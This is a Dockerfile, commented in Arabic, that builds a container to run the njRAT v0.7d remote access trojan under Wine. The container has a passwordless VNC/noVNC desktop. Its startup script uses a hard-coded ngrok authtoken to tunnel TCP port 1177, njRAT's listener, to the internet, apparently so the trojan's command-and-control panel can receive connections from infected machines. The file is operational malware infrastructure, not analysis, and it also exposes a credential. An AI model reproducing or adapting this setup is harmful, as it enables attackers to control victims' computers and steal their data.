FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN dpkg --add-architecture i386 && \
    apt-get update && apt-get install -y \
    xvfb \
    x11vnc \
    novnc \
    websockify \
    fluxbox \
    wine32 \
    wine64 \
    winetricks \
    curl \
    gnupg \
    && rm -rf /var/lib/apt/lists/*

RUN curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | gpg --dearmor -o /etc/apt/keyrings/ngrok.gpg && \
    echo "deb [signed-by=/etc/apt/keyrings/ngrok.gpg] https://ngrok-agent.s3.amazonaws.com buster main" | tee /etc/apt/sources.list.d/ngrok.list && \
    apt-get update && apt-get install -y ngrok

WORKDIR /app

# انسخ ملف البرنامج (تأكد من إزالة المسافات من اسم الملف)
COPY njRAT_v0.7d.exe /app/app.exe

EXPOSE 10000

# كتابة سكربت الإقلاع داخل الحاوية
RUN echo '#!/bin/bash\n\
# تشغيل العرض الافتراضي\n\
Xvfb :1 -screen 0 1024x768x16 &\n\
export DISPLAY=:1\n\
sleep 2\n\
fluxbox &\n\
x11vnc -forever -shared -bg -nopw -display :1 &\n\
\n\
# تثبيت .NET Framework (مرة واحدة)\n\
winetricks -q dotnet40 2>&1 | tee /app/winetricks.log\n\
\n\
# إعداد Ngrok\n\
ngrok config add-authtoken Cr_3GGdkvG7pObxEzyudWvsReOI1J4\n\
ngrok tcp 1177 &\n\
\n\
# تشغيل البرنامج مع تسجيل الأخطاء\n\
wine /app/app.exe 2>&1 | tee /app/wine.log &\n\
\n\
# تشغيل noVNC\n\
/usr/share/novnc/utils/launch.sh --vnc localhost:5900 --listen 10000\n\
' > /app/start.sh && chmod +x /app/start.sh

CMD ["/app/start.sh"]
